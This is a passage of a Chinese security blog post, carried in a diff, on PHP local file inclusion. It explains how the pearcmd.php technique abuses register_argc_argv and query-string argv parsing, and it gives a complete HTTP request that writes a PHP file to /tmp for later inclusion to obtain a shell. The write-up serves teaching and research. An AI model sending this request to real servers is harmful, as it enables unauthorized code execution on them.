+        array_init(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
+    &#125;
+    ...
+</code></pre>
+<p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p>
+<pre><code class="php">php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);
+</code></pre>
+<p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p>
+<p>果然：</p>
+<p><a target="_blank" rel="noopener" href="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png"><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></a></p>
+<p>其实这个结果是符合<a target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>的：</p>
+<blockquote>
+<p>4.4.  The Script Command Line</p>
+<p>Some systems support a method for supplying an array of strings to<br>   the CGI script.  This is only used in the case of an ‘indexed’ HTTP<br>   query, which is identified by a ‘GET’ or ‘HEAD’ request with a URI<br>   query string that does not contain any unencoded “=” characters.  For<br>   such a request, the server SHOULD treat the query-string as a<br>   search-string and parse it into words, using the rules</p>
+<pre><code class="php">  search-string = search-word *( &quot;+&quot; search-word )
+  search-word   = 1*schar
+  schar         = unreserved | escaped | xreserved
+  xreserved     = &quot;;&quot; | &quot;/&quot; | &quot;?&quot; | &quot;:&quot; | &quot;@&quot; | &quot;&amp;&quot; | &quot;=&quot; | &quot;,&quot; |
+                  &quot;$&quot;
+</code></pre>
+<p>After parsing, each search-word is URL-decoded, optionally encoded in<br>   a system-defined manner and then added to the command line argument<br>   list.</p>
+</blockquote>
+<p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p>
+<p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER[&#39;argv&#39;]</code>。</p>
+<p>我们再来看到pear中获取命令行argv的函数：</p>
+<pre><code class="php">public static function readPHPArgv()
+&#123;
+    global $argv;
+    if (!is_array($argv)) &#123;
+        if (!@is_array($_SERVER[&#39;argv&#39;])) &#123;
+            if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) &#123;
+                $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;
+                return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);
+            &#125;
+            return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];
+        &#125;
+        return $_SERVER[&#39;argv&#39;];
+    &#125;
+    return $argv;
+&#125;
+</code></pre>
+<p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p>
+<p>看看pear中有哪些可以利用的参数：</p>
+<p><a target="_blank" rel="noopener" href="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png"><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="image-20211101074033767.png"></a></p>
+<p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
+<p>所以，我构造出最后的利用数据包如下：</p>
+<pre><code class="php">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
+Host: 192.168.1.162:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205856136.png" alt="image-20221130205856136"></p>
+<p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205909317.png" alt="image-20221130205909317"></p>
+<p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205927264.png" alt="image-20221130205927264"></p>
+<p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201060?display=mobile">https://www.anquanke.com/post/id/201060?display=mobile</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5535#toc-5">https://xz.aliyun.com/t/5535#toc-5</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106498971">https://blog.csdn.net/qq_45521281/article/details/106498971</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
+<p><a target="_blank" rel="noopener" href="http://tttang.com/archive/1312/#toc_0x06-pearcmdphp">http://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/11/23/php文件包含总结/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/php/">php</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">包含函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.</span> <span class="toc-text">支持的协议和封装协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%90%84%E7%A7%8D%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">利用各种伪协议读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell%E6%80%9D%E8%B7%AF"><span class="toc-number">4.3.</span> <span class="toc-text">GetShell思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-include-%E5%BC%80%E5%90%AF%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">4.3.1.</span> <span class="toc-text">allow_url_include 开启的情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-include-%E5%85%B3%E9%97%AD%E5%8F%8Coff%E7%9A%84%E6%83%85%E5%86%B5-window%E7%8E%AF%E5%A2%83%E4%B8%8B"><span class="toc-number">4.3.2.</span> <span class="toc-text">allow_url_include 关闭双off的情况(window环境下)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A81-UNC-gt-SMB"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">利用1: UNC-&gt;SMB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A82-UNC-gt-webdav"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">利用2:UNC-&gt;webdav</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E3%80%81%E7%8E%AF%E5%A2%83%E6%96%87%E4%BB%B6%E7%AD%89%E5%8F%AF%E6%8E%A7%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.3.</span> <span class="toc-text">尝试包含日志文件、环境文件等可控文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E7%B3%BB%E7%BB%9F"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">Linux 系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E7%AD%89%E5%8A%9F%E8%83%BD%E7%BB%93%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">4.3.4.</span> <span class="toc-text">存在上传图片等功能结合文件包含getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo-LFI-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell"><span class="toc-number">4.3.5.</span> <span class="toc-text">phpinfo-LFI 本地文件包含临时文件getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E9%80%9A%E9%85%8D%E7%AC%A6%E5%A6%99%E7%94%A8"><span class="toc-number">4.3.6.</span> <span class="toc-text">Windows 通配符妙用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-php7-Segment-Fault-Getshell"><span class="toc-number">4.3.7.</span> <span class="toc-text">LFI + php7 Segment Fault Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%9D%A5getshell"><span class="toc-number">4.3.8.</span> <span class="toc-text">利用session进行文件包含来getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pearcmd-php%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8"><span class="toc-number">4.3.9.</span> <span class="toc-text">pearcmd.php的巧妙利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/">GraphQL注入 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
